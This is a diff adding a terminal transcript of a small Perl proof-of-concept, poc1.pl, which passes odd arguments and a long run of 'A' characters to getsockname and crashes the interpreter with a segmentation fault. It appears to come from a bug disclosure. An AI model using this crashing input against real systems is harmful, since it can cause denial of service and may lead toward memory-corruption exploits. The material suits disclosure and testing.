@@ -1,0 +1,11 @@
+jonathan () blackbox:~/test$ cat poc1.pl
+    #!/usr/bin/perl
+    $a =
+getsockname(9505,4590,"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAA",17792);
+    jonathan () blackbox:~/test$ perl poc1.pl
+    Segmentation fault (core dumped)
+    jonathan () blackbox:~/test$
+
